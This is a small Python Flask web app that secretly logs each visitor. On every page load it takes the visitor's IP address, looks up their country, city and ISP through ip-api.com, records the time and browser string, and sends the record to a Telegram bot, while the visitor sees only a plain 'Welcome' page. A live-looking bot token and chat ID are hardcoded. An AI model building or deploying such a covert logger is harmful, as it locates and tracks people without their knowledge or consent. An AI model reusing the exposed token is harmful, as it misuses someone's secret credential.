from flask import Flask, request
import requests
import datetime

app = Flask(__name__)

TOKEN = "8011301271:AAEBnvieCbnWU7NAR3rv5sqr--lOqaxpSr4"
CHAT_ID = "498639695"

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return response.json()
    except:
        return {"query": ip, "status": "fail"}

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    info = get_ip_info(ip)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = f"""IP Log:
IP: {info.get('query')}
Country: {info.get('country')}
Region: {info.get('regionName')}
City: {info.get('city')}
ISP: {info.get('isp')}
Time: {now}
User-Agent: {request.headers.get("User-Agent")}"""

    send_to_telegram(message)
    return "<h1>Welcome</h1>"

if __name__ == "__main__":
    app.run()
